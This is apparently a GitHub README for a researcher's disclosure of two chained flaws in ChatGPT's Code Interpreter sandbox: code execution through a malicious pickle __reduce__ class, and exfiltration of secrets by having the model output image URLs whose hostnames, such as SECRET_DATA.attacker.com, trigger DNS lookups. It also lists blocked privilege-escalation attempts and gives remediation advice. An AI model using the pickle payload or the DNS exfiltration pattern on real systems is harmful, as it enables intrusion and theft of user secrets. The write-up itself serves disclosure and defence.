# Dual Critical Failures: AI Sandbox Security Research

![Security Research](https://img.shields.io/badge/Security-Research-red)
![CVE Status](https://img.shields.io/badge/CVE-Unreported%20by%20Vendor-orange)
![CVSS](https://img.shields.io/badge/CVSS%203.1-9.1%20Critical-critical)
![Research Period](https://img.shields.io/badge/Research-Dec%202024%20--%20Jan%202025-blue)

**Comprehensive validation of DNS Exfiltration and Python Pickle RCE attack chains in AI Code Execution Sandboxes**

> **Target:** ChatGPT Code Interpreter (Advanced Data Analysis)  
> **Author:** Kai Aizen ([@SnailSploit](https://github.com/snailsploit))  
> **Status:** REPORTED TO OPENAI → DISMISSED

---

## Executive Summary

This research documents two critical security vulnerabilities in OpenAI's ChatGPT Code Interpreter that form a synergistic attack chain enabling **arbitrary code execution** and **data exfiltration** from an ostensibly air-gapped sandbox environment.

### The "Dual Critical Failures"

| Failure | Vulnerability | CWE | CVSS | Description |
|---------|--------------|-----|------|-------------|
| **A** | Python Pickle RCE | CWE-502 | 8.1 | Insecure deserialization via `__reduce__` enables arbitrary code execution |
| **B** | DNS Exfiltration | CWE-200 | 7.5 | Canvas rendering triggers browser DNS queries, creating covert egress channel |
| **Combined** | Kill Chain | Combined | **9.1 Critical** | RCE + Exfiltration bypasses all server-side network controls |

### Key Insight

While modern AI sandboxes successfully mitigate traditional privilege escalation attacks (PwnKit, Dirty Pipe, IMDS), they remain **catastrophically vulnerable** to application-layer attack chains that abuse existing user privileges rather than attempting to escalate them.

---

## Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        DUAL CRITICAL FAILURES KILL CHAIN                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │
│  │  1. INGRESS │───▶│  2. TRIGGER │───▶│ 3. EXECUTE  │───▶│ 4. HARVEST  │   │
│  │             │    │             │    │             │    │             │   │
│  │ Upload      │    │ "Analyze    │    │ __reduce__  │    │ Read        │   │
│  │ malicious   │    │  this file" │    │ method      │    │ /proc/env   │   │
│  │ .pkl file   │    │             │    │ executes    │    │ secrets     │   │
│  └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘   │
│         │                                                        │          │
│         │              FAILURE A: PICKLE RCE (CWE-502)           │          │
│         └────────────────────────────────────────────────────────┘          │
│                                                                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │
│  │  5. ENCODE  │───▶│  6. OUTPUT  │───▶│ 7. RENDER   │───▶│ 8. CAPTURE  │   │
│  │             │    │             │    │             │    │             │   │
│  │ Base32/64   │    │ Print       │    │ Browser DNS │    │ Attacker    │   │
│  │ encode      │    │ hostnames   │    │ lookup      │    │ nameserver  │   │
│  │ secrets     │    │ in canvas   │    │ triggered   │    │ logs query  │   │
│  └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘   │
│         │                                                        │          │
│         │              FAILURE B: DNS EXFIL (CWE-200)            │          │
│         └────────────────────────────────────────────────────────┘          │
│                                                                              │
│  ═══════════════════════════════════════════════════════════════════════    │
│  RESULT: Complete confidentiality breach bypassing all server-side controls │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Repository Structure

```
chatgpt-sandbox-security-research/
├── README.md                           # This file
├── SECURITY.md                         # Responsible disclosure info
├── LICENSE                             # MIT License
│
├── docs/
│   ├── Dual_Critical_Failures_Research_Paper.docx   # Full academic paper
│   ├── Validating_AI_Sandbox_Security_Failures_Report.pdf
│   ├── Privilege_Escalation_Attack__Defense_Workflow.pdf
│   └── dns_exfiltration_writeup.md     # DNS technique documentation
│
├── evidence/
│   ├── screenshots/
│   │   ├── 01_disk_filling_dos.jpg          # DoS attack evidence
│   │   ├── 02_aws_imds_blocked.jpg          # IMDS timeout proof
│   │   ├── 03_pickle_rce_reverse_shell.jpg  # RCE execution proof
│   │   ├── 04_pickle_rce_detail.jpg         # Detailed RCE output
│   │   ├── 05_kubernetes_escape_blocked.jpg # K8s escape blocked
│   │   ├── 06_mnt_data_directory.jpg        # Staging directory
│   │   └── 07_root_filesystem_enum.jpg      # Filesystem enumeration
│   │
│   └── logs/
│       ├── exported_script_log.txt          # Pickle execution logs
│       ├── ransomware__1_.log               # Pickle indicator test
│       └── network_hosts_mapping.txt        # DNS/Network mapping
│
└── tools/
    └── (proof-of-concept scripts)
```

---

## Vulnerability Details

### Critical Failure A: Python Pickle RCE

**The `__reduce__` method enables arbitrary code execution during deserialization.**

```python
class Malicious:
    def __reduce__(self):
        return (os.system, ("whoami",))  # Executes on pickle.load()

# Attacker uploads payload to /mnt/data/
serialized_payload = pickle.dumps(Malicious())

# AI executes when processing "analyze this file"
malicious_object = pickle.loads(serialized_payload)  # RCE TRIGGERED
```

**Evidence Screenshot:**

![Pickle RCE Evidence](evidence/screenshots/03_pickle_rce_reverse_shell.jpg)

The "Connection refused" error **proves execution** - the code ran, only the network connection was blocked.

### Critical Failure B: DNS Exfiltration via Canvas

**The canvas renders untrusted hostnames, triggering DNS queries from the user's browser.**

```
Model Output:     print("![](https://SECRET_DATA.attacker.com/x.png)")
        ↓
Canvas Renders:   <img src="https://SECRET_DATA.attacker.com/x.png">
        ↓
Browser DNS:      A? SECRET_DATA.attacker.com → Attacker's Nameserver
        ↓
Exfiltration:     Attacker logs query, decodes SECRET_DATA
```

**DNS Message Format:**
```
<index><separator><payload-chunk>.attacker-zone.tld

Example:
p001_db.MFRGGZDFMZTQ====.exfil.lab
p002_db.MFWWK3TLNB2GI===.exfil.lab
```

### Why This Bypasses All Server-Side Controls

| Defense | Why It Fails |
|---------|--------------|
| Container Firewall | Request originates from user's browser, not sandbox |
| HTTP Blocking | Exfiltration uses DNS query names, not HTTP body |
| CORS | Prevents reading response, not sending request |
| CSP | Cannot block DNS resolution for rendered hostnames |

---

## Failed Exploit Attempts (What IS Blocked)

Our testing validated that the sandbox **successfully mitigates** traditional privilege escalation:

| Exploit | CVE | Result | Blocking Control |
|---------|-----|--------|------------------|
| PwnKit | CVE-2021-4034 | ❌ BLOCKED | `no-new-privileges=1` |
| Dirty Pipe | CVE-2022-0847 | ❌ BLOCKED | Seccomp filters |
| Dirty COW | CVE-2016-5195 | ❌ BLOCKED | Kernel patches |
| AWS IMDS | N/A | ❌ BLOCKED | Network timeout |
| K8s Escape | N/A | ❌ BLOCKED | Orchestrator policies |

**This is the paradox:** The sandbox is well-hardened against *vertical* privilege escalation but vulnerable to *horizontal* application-layer abuse.

---

## The Meta Comparison

| Aspect | Meta (Llama-Stack) | OpenAI (ChatGPT) |
|--------|-------------------|------------------|
| Vulnerability | Pickle RCE | Pickle RCE + DNS Exfil |
| Response Time | **11 days to patch** | Dismissed |
| Fix Applied | Replaced pickle with JSON | None |
| CVE Issued | **CVE-2024-50050** | No |
| CVSS Score | 9.3 (Snyk) | N/A |

---

## Remediation Recommendations

### For Pickle RCE (Failure A)

1. **Deprecate pickle** for user-uploaded data; mandate JSON, Parquet, safetensors
2. **Block** `pickle.load()` on files from `/mnt/data`
3. **Sandboxed deserialization** in isolated micro-VMs with no secrets

### For DNS Exfiltration (Failure B)

1. **Treat canvas output as untrusted** - sanitize before rendering
2. **Render hostnames as inert text** unless explicitly allowlisted
3. **Enforce limits** on hostname count/length per render
4. **Monitor** for high-entropy subdomains in egress DNS

### Network Controls

1. Centralize DNS egress through controlled resolvers
2. Alert on DNS labels > 40 chars with high Shannon entropy
3. Implement Response Policy Zones for rapid quarantine

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Application |
|--------|-----------|-------------|
| Initial Access | T1566.001 Phishing: Attachment | Malicious pickle upload |
| Execution | T1059.006 Python | Pickle `__reduce__` RCE |
| Credential Access | T1552.001 Credentials in Files | Harvest `/proc/1/environ` |
| Exfiltration | T1048.003 Exfil Over Alt Protocol | DNS subdomain tunneling |
| Impact | T1499 Endpoint DoS | Disk filling |

---

## Timeline

| Date | Event |
|------|-------|
| Sep 29, 2024 | Oligo reports CVE-2024-50050 to Meta |
| Oct 10, 2024 | Meta patches Llama-Stack (replaced pickle with JSON) |
| Oct 24, 2024 | CVE-2024-50050 issued (CVSS 9.3) |
| Dec 2024 | SnailSploit research begins on ChatGPT |
| Jan 2025 | Research completed & reported to OpenAI |
| Jan 2025 | OpenAI dismisses report |

---

## Responsible Disclosure

This research was conducted with responsible disclosure practices:

- All testing performed on researcher's own accounts
- No real user data was accessed or exfiltrated
- DNS exfiltration tested against researcher-controlled infrastructure
- Full report submitted to OpenAI prior to publication

---

## Citation

```bibtex
@article{aizen2025dualcritical,
  title={Dual Critical Failures: Validating DNS Exfiltration and Python Pickle RCE Attack Chains in AI Sandboxes},
  author={Aizen, Kai},
  journal={SnailSploit Security Research},
  year={2025},
  month={February},
  url={https://github.com/snailsploit/chatgpt-sandbox-security-research}
}
```

---

## Contact

- **Researcher:** Kai Aizen
- **Handle:** SnailSploit
- **Website:** [snailsploit.com](https://snailsploit.com)
- **GitHub:** [@snailsploit](https://github.com/snailsploit)

---

## License

This research is released under the MIT License. See [LICENSE](LICENSE) for details.

---

> **Disclaimer:** This research is provided for educational and defensive purposes only. The techniques documented here should only be used in authorized security assessments. The researcher accepts no liability for misuse of this information.
